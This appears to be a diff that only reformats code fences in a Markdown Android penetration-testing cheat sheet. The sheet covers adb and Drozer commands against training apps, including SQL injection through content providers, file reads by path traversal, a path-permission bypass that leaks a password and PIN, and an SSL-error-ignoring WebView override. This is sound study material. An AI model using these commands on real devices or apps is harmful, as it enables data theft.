@@ -18,7 +18,8 @@
 
 <b>Creating an URL Handler Scheme:</b>
 
-```<activity android:name=".MyUriActivity">
+```
+<activity android:name=".MyUriActivity">
     <intent-filter>
         <action android:name="android.intent.action.VIEW" />
         <category android:name="android.intent.category.DEFAULT" />
@@ -38,7 +39,8 @@
 
 <b>Get the current SDK version:</b>
 
-```$ adb shell grep ro.build.version.sdk= system/build.prop
+```
+$ adb shell grep ro.build.version.sdk= system/build.prop
 ro.build.version.sdk=25
 ```
 
@@ -65,7 +67,8 @@ aapt -> Android Asset Packaging Tool
 - adb logcat // View the device logs
 
 
-```shell@android:/ $ pm list packages -> ask the package manager to list all the installed packages
+```
+shell@android:/ $ pm list packages -> ask the package manager to list all the installed packages
 shell@android:/ $ pm path <package_name> -> Find the stored APK path of an installed application
 shell@android:/ $ pm install /path/to/apk
 shell@android:/ $ pm uninstall <package_name>
@@ -73,26 +76,30 @@ shell@android:/ $ pm disable <package_name>
 ```
 
 - logcat is a privileged tool that allows you to view system and application logs with flexible filters.
-```shell@android:/ $ logcat
+```
+shell@android:/ $ logcat
 shell@android:/ $ logcat -s tag -> If you know the name of the tag you are looking for
 ```
 
 ---------------
 
-```shell@android:/ $ getprop -> get system properties
+```
+shell@android:/ $ getprop -> get system properties
 shell@android:/ $ dumpsys -> dump status of all system information and services 
 shell@android:/ $ service list
 ```
 
 <b>Drozer commands:</b>
 
-```$ adb forward tcp:31415 tcp:31415
+```
+$ adb forward tcp:31415 tcp:31415
 $ drozer console connect
 ```
 
 ```dz> run app.package.debuggable --> Find debuggable applications```
 
-```dz> run app.package.list -f insecure
+```
+dz> run app.package.list -f insecure
 dz> run app.package.info -a com.android.insecurebankv2
 dz> run app.package.manifest com.android.insecurebankv2
 dz> run app.package.attacksurface com.android.insecurebankv2
@@ -100,8 +107,9 @@ dz> run app.activity.info -a com.android.insecurebankv2
 dz> run app.activity.start --component com.android.insecurebankv2 com.android.insecurebankv2.ViewStatement
 ```
 
-```dz> run app.package.list -p android.permission.READ_SMS -> search for applications that requested an specific permission```
-
+```
+dz> run app.package.list -p android.permission.READ_SMS -> search for applications that requested an specific permission
+```
 
 - To find query paths of Content Providers of an APP:
 
@@ -109,14 +117,16 @@ dz> run app.activity.start --component com.android.insecurebankv2 com.android.in
 
 - To Query content providers:
 
-```dz> run app.provider.query content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/
+```
+dz> run app.provider.query content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/
 dz> run app.provider.query content://settings/system
 dz> run app.provider.query content://sms
 ```
 
 - Inserting into Content providers:
 
-```dz> run app.provider.insert content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/ --integer id 2 --string name n3k
+```
+dz> run app.provider.insert content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/ --integer id 2 --string name n3k
 dz> run app.provider.insert content://com.mwr.example.sieve.DBContentProvider/Passwords  --integer _id 3 --string service Facebook --string username tyrone --string password zA76WR9mURDNNEw4TUiidVKRuKLEamg5h84T --string email tyrone@gmail.com 
 ```
 
@@ -144,7 +154,8 @@ Find pre-installed applications that allow to install new packages:
 
 - Content providers were the only application component that was exported by default on Android, but this situation has since been amended in API version 17. Note that the default behavior is still to export a content provider if the android:targetSdkVersion is set to a value smaller than 17, and so these issues are still prevalent.
 
-```final Cursor query( 
+```
+final Cursor query( 
        Uri uri, 
        String[] projection, 
        String selection, 
@@ -154,13 +165,16 @@ Find pre-installed applications that allow to install new packages:
 
 ```select projection from table_name(uri) where selection=selectionArgs order by sortOrder```
 
-```dz> run app.provider.query content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/ --projection "'"
+```
+dz> run app.provider.query content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/ --projection "'"
 unrecognized token: "' FROM names ORDER BY name" (code 1): , while compiling: SELECT ' FROM names ORDER BY name
 ```
 
-```dz> run app.provider.query content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/ --projection "* from sqlite_master where type='table'--"
 ```
-```| type  | name             | tbl_name         | rootpage | sql                                                                            |
+dz> run app.provider.query content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/ --projection "* from sqlite_master where type='table'--"
+```
+```
+| type  | name             | tbl_name         | rootpage | sql                                                                            |
 | table | android_metadata | android_metadata | 3        | CREATE TABLE android_metadata (locale TEXT)                                    |
 | table | names            | names            | 4        | CREATE TABLE names (id INTEGER PRIMARY KEY AUTOINCREMENT,  name TEXT NOT NULL) |
 | table | sqlite_sequence  | sqlite_sequence  | 5        | CREATE TABLE sqlite_sequence(name,seq)                                         |
@@ -168,7 +182,8 @@ unrecognized token: "' FROM names ORDER BY name" (code 1): , while compiling: SE
 
 - You can automate the detection of SQL injection vulnerabilities using drozer in conjunction with the scanner.provider.injection module.
 
-```dz> run scanner.provider.injection -a content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/
+```
+dz> run scanner.provider.injection -a content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/
 	Not Vulnerable:
 	  No non-vulnerable URIs found.
 ```
@@ -181,7 +196,8 @@ unrecognized token: "' FROM names ORDER BY name" (code 1): , while compiling: SE
 
 ```content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/ ```
 
-```dz> run scanner.provider.sqltables -a content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/ 
+```
+dz> run scanner.provider.sqltables -a content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/ 
 
 	Accessible tables for uri content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers/:
 	  android_metadata
@@ -194,7 +210,8 @@ unrecognized token: "' FROM names ORDER BY name" (code 1): , while compiling: SE
 
 Implementing a content provider that allows other applications to retrieve files in a structured and secure way is possible. However, the mechanisms for doing so can be prone to vulnerabilities that allow the retrieval of arbitrary files under the UID of the content provider’s application. You can programmatically create these content providers by implementing a public ParcelFileDescriptor openFile(Uri, String) method. If the URI being requested is not strictly validated against a whitelist of allowed files or folders, this opens up the application to attack. An easy way to check whether a content provider allows the retrieval of any file is by requesting the /system/etc/hosts file, which always exists and is word readable on Android devices. The following example shows how to exploit one such content provider in Sieve to retrieve /system/etc/hosts:
 
-```dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/system/etc/hosts
+```
+dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/system/etc/hosts
 
 127.0.0.1 localhost
 ```
@@ -231,7 +248,8 @@ In all aspects of computer security, logic flaws can exist. Rewinding back to wh
 ```
 The comparison is done using a literal check. You can find the original form of this check that drozer parsed out in the following snippet of Sieve’s manifest:
 
-```<provider name=".DBContentProvider" 
+```
+<provider name=".DBContentProvider" 
               exported="true" 
               multiprocess="true" 
               authorities="com.mwr.example.sieve.DBContentProvider"> 
@@ -239,7 +257,7 @@ The comparison is done using a literal check. You can find the original form of 
                        writePermission="com.mwr.example.sieve.WRITE_KEYS" 
                        path="/Keys"> 
       </path-permission> 
-    </provider> 
+ </provider> 
  ```   
 On the <path-permission> tag, the path attribute was used. The definition of the path attribute is as follows from http://developer.android.com/guide/topics/manifest/path-permission-element.html:
 
@@ -248,13 +266,15 @@ A complete URI path for a subset of content provider data. Permission can be gra
 
 The key word in this definition is particular. This means that only the /Keys path is being protected by this permission. What about the /Keys/ path? Querying the /Keys path you get a permission denial:
 
-```dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys 
+```
+dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys 
 Permission Denial: reading com.mwr.example.sieve.DBContentProvider uri content://com.mwr.example.sieve.DBContentProvider/Keys from pid=1409,  uid=10059 requires com.mwr.example.sieve.READ_KEYS, or  grantUriPermission() 
 ```
 
 But when you query the /Keys/ path you get the following:
 
-```dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/ 
+```
+dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/ 
 	| Password                | pin  | 
 	| Thisismylongpassword123 | 1234 | 
 ```
@@ -272,7 +292,8 @@ Let us zoom into one of the vulnerabilities that he used so you can see how to c
 
 He discovered that a started service was exported in com.android.clipboardsaveservice that could be used to copy a file from one location to another. This package also held the WRITE_EXTERNAL_STORAGE permission, meaning that it could also copy to the SD card. Here is the proof of concept given by André:
 
-```dz> run app.service.start --action com.android.clipboardsaveservice.CLIPBOARD_SAVE_SERVICE --extra string copyPath /sdcard/bla --extra string pastePath /sdcard/restore/
+```
+dz> run app.service.start --action com.android.clipboardsaveservice.CLIPBOARD_SAVE_SERVICE --extra string copyPath /sdcard/bla --extra string pastePath /sdcard/restore/
 ```
 
 - Unprotected Bound Services:
@@ -390,7 +411,8 @@ The TrustManager’s job is to ensure that the information provided by the serve
 
 A WebView is an embeddable application element that allows web pages to be rendered within an application. It makes use of web rendering engines for the loading of web pages and provides browser-like functionality. Similarly to native code, ignoring SSL errors when loading content is possible. A callback can be overridden in the WebViewClient class that handles SSL errors and is named onReceivedSslError. This callback by default cancels the loading of the page if the SSL certificate failed one of the checks performed on it and was found to be invalid. Developers may not be able to meet these conditions during development and may choose to override the check instead
 
-```@Override 
+```
+@Override 
 public void onReceivedSslError(WebView view, SslErrorHandler handler, 
 SslError error) 
 { 
@@ -404,7 +426,8 @@ First we need to get the resolution used:
 
 ```$ adb shell dumpsys window displays```
 
-```WINDOW MANAGER DISPLAY CONTENTS (dumpsys window displays)
+```
+WINDOW MANAGER DISPLAY CONTENTS (dumpsys window displays)
   Display: mDisplayId=0
     init=1440x2560 640dpi cur=1440x2560 app=1440x2560 rng=1440x1344-2560x2464
     deferred=false layoutNeeded=false
@@ -420,7 +443,8 @@ To capture cursor position in the screen
 
 ...Then touch the screen
 
-```/dev/input/event5: EV_ABS       ABS_MT_PRESSURE      00000001
+```
+/dev/input/event5: EV_ABS       ABS_MT_PRESSURE      00000001
 /dev/input/event5: EV_ABS       ABS_MT_POSITION_X    0000051d
 /dev/input/event5: EV_ABS       ABS_MT_POSITION_Y    00000915
 /dev/input/event5: EV_SYN       SYN_MT_REPORT        00000000
